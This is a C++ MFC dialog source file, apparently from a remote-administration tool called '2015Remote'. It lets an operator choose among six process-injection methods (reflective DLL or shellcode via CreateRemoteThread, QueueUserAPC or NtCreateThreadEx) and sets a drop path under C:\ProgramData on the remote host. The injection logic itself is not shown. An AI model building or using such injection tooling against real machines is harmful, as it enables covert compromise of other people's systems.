// CInjectCodeDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "CInjectCodeDlg.h"

// CInjectCodeDlg 对话框
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

IMPLEMENT_DYNAMIC(CInjectCodeDlg, CDialog)

CInjectCodeDlg::CInjectCodeDlg(CWnd* pParent /*=nullptr*/)
    : CDialogLang(IDD_INJECTINFO, pParent)
    , Str_loacal(_T("本地文件路径"))
    , Str_remote(_T(""))
{
}

CInjectCodeDlg::~CInjectCodeDlg()
{
}

void CInjectCodeDlg::DoDataExchange(CDataExchange* pDX)
{
    __super::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_COMBO_INJECTS, m_combo_main);
    DDX_Text(pDX, IDC_EDIT_PATH, Str_loacal);
    DDX_Text(pDX, IDC_EDIT_PATH_REMOTE, Str_remote);
}


BEGIN_MESSAGE_MAP(CInjectCodeDlg, CDialog)
    ON_BN_CLICKED(IDC_BUTTON_CHOOSE, &CInjectCodeDlg::OnBnClickedButtonChoose)
    ON_BN_CLICKED(IDC_BUTTON_INJECT, &CInjectCodeDlg::OnBnClickedButtonInject)
    ON_CBN_SELCHANGE(IDC_COMBO_INJECTS, &CInjectCodeDlg::OnCbnSelchangeComboInjects)
END_MESSAGE_MAP()

BOOL CInjectCodeDlg::OnInitDialog()
{
    __super::OnInitDialog();
    int i = 0;
    m_combo_main.InsertStringL(i++, _T("CreateRemoteThread(落地反射注入)"));
    m_combo_main.InsertStringL(i++, _T("QueueUserAPC(落地反射注入)"));
    m_combo_main.InsertStringL(i++, _T("NtCreateThreadEx(落地反射注入)"));

    m_combo_main.InsertStringL(i++, _T("CreateRemoteThread(shellcode注入)"));
    m_combo_main.InsertStringL(i++, _T("QueueUserAPC(shellcode注入)"));
    m_combo_main.InsertStringL(i++, _T("NtCreateThreadEx(shellcode注入)"));

    m_combo_main.SetCurSel(0);

    SYSTEMTIME stTime;
    GetLocalTime(&stTime);
    WORD wMonth = stTime.wMonth;
    WORD wDay = stTime.wDay;
    WORD wHour = stTime.wHour;
    WORD wMinute = stTime.wMinute;
    WORD wSecond = stTime.wSecond;
    Str_remote.FormatL( _T("C:\\ProgramData\\%d%d%d%d%d.dll"), wMonth, wDay, wHour, wMinute, wSecond);
    ((CEdit*)GetDlgItem(IDC_EDIT_PATH_REMOTE))->SetWindowText(Str_remote);

    isel = 0;
    return TRUE;
}

void CInjectCodeDlg::OnBnClickedButtonChoose()
{
    CFileDialog dlg(FALSE, NULL, NULL, OFN_HIDEREADONLY, _T("All Files (*.*)|*.*||"), this);
    if (dlg.DoModal() != IDOK)
        return;
    SetDlgItemText(IDC_EDIT_PATH, dlg.GetPathName());
}


void CInjectCodeDlg::OnBnClickedButtonInject()
{
    UpdateData(TRUE);
    __super::OnOK();
}


void CInjectCodeDlg::OnCbnSelchangeComboInjects()
{
    isel =m_combo_main.GetCurSel();
    if (isel<3) {
        ((CEdit*)GetDlgItem(IDC_EDIT_PATH_REMOTE))->EnableWindow(TRUE);

    } else {
        ((CEdit*)GetDlgItem(IDC_EDIT_PATH_REMOTE))->EnableWindow(FALSE);
    }
}
